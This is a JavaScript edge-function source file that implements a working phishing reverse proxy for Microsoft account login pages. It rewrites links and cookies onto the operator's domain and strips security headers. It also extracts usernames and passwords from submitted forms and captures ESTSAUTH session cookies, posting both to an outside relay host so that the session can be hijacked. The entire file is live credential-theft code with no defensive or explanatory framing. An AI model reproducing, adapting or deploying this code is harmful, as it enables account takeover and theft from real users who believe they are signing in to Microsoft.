export const runtime = 'edge';

// ==================== SIMPLE CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Only proxy Microsoft login domains
const PROXY_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com', 
  'account.live.com',
  'account.microsoft.com',
  'aadcdn.msauth.net'
];

// ==================== HELPER FUNCTIONS ====================

async function sendToVercel(data, ip) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ data, ip, timestamp: new Date().toISOString() }),
    });
  } catch (e) {}
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username');
    pass = params.get('passwd') || params.get('password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}
  
  return { user, pass };
}

// ==================== MAIN HANDLER ====================

export default async function handler(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 'unknown';
  
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  // Handle root path - redirect directly to Microsoft login (bypass Office.com)
  if (url.pathname === '/' || url.pathname === '') {
    const redirectUrl = `https://${YOUR_DOMAIN}/_p/login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=RANDOM&ui_locales=en-US&mkt=en-US`;
    
    console.log(`[REDIRECT] Root -> Microsoft login`);
    return new Response(null, {
      status: 302,
      headers: { 'Location': redirectUrl }
    });
  }
  
  // Extract domain from /_p/domain/path format
  let targetHost = null;
  let targetPath = url.pathname;
  
  if (url.pathname.startsWith('/_p/')) {
    const parts = url.pathname.substring(4).split('/');
    if (parts.length >= 1) {
      const potentialDomain = parts[0];
      if (PROXY_DOMAINS.includes(potentialDomain)) {
        targetHost = potentialDomain;
        targetPath = '/' + parts.slice(1).join('/');
      }
    }
  }
  
  if (!targetHost) {
    return new Response('Not found', { status: 404 });
  }
  
  // Build target URL - preserve original query string
  const targetUrl = `https://${targetHost}${targetPath}${url.search}`;
  
  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${targetUrl}`);
  
  // Build request headers
  const headers = new Headers();
  
  for (const [key, value] of request.headers) {
    const lowerKey = key.toLowerCase();
    if (!['host', 'connection', 'content-length', 'content-encoding', 
           'transfer-encoding', 'cf-ray', 'cf-connecting-ip'].includes(lowerKey)) {
      headers.set(key, value);
    }
  }
  
  headers.set('Host', targetHost);
  
  // Handle request body
  let body = request.body;
  
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user}`);
        await sendToVercel(`Credentials:\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`, ip);
      }
      
      body = bodyText;
    } catch (err) {
      body = request.body;
    }
  }
  
  try {
    const response = await fetch(targetUrl, {
      method: request.method,
      headers: headers,
      body: body,
      redirect: 'manual'
    });
    
    // Handle redirects
    if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
      let location = response.headers.get('Location');
      
      // Rewrite redirects that go to domains we proxy
      for (const domain of PROXY_DOMAINS) {
        if (location.includes(domain)) {
          location = location.replace(new RegExp(`https?://${domain.replace(/\./g, '\\.')}`), `https://${YOUR_DOMAIN}/_p/${domain}`);
          break;
        }
      }
      
      console.log(`[REDIRECT] ${response.status} -> ${location}`);
      
      return new Response(null, {
        status: response.status,
        headers: { 'Location': location }
      });
    }
    
    // Process response
    const responseHeaders = new Headers();
    
    for (const [key, value] of response.headers) {
      const lowerKey = key.toLowerCase();
      
      if (lowerKey === 'set-cookie') {
        let modifiedCookie = value;
        modifiedCookie = modifiedCookie.replace(
          new RegExp(targetHost.replace(/\./g, '\\.'), 'g'),
          YOUR_DOMAIN
        );
        responseHeaders.append('Set-Cookie', modifiedCookie);
      } 
      else if (!['content-security-policy', 'content-security-policy-report-only'].includes(lowerKey)) {
        responseHeaders.set(key, value);
      }
    }
    
    // Check for auth cookies
    const setCookies = response.headers.getSetCookie();
    if (setCookies && setCookies.length) {
      const allCookies = setCookies.join('; ');
      const hasESTSAUTH = allCookies.toLowerCase().includes('estsauth=');
      const hasESTSAUTHPERSISTENT = allCookies.toLowerCase().includes('estsauthpersistent=');
      
      if (hasESTSAUTH && hasESTSAUTHPERSISTENT) {
        console.log(`[EXFIL] Complete session captured!`);
        await sendToVercel(`Cookies:\n${allCookies}\nURL: ${url.href}`, ip);
      }
    }
    
    // Process response body
    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || contentType.includes('javascript') || contentType.includes('json')) {
      let text = await response.text();
      
      for (const domain of PROXY_DOMAINS) {
        const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(regex, `https://${YOUR_DOMAIN}/_p/${domain}`);
      }
      
      return new Response(text, {
        status: response.status,
        headers: responseHeaders
      });
    }
    
    return new Response(response.body, {
      status: response.status,
      headers: responseHeaders
    });
    
  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { status: 502, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

export const GET = handler;
export const POST = handler;
export const PUT = handler;
export const DELETE = handler;
export const PATCH = handler;
export const OPTIONS = handler;
export const HEAD = handler;
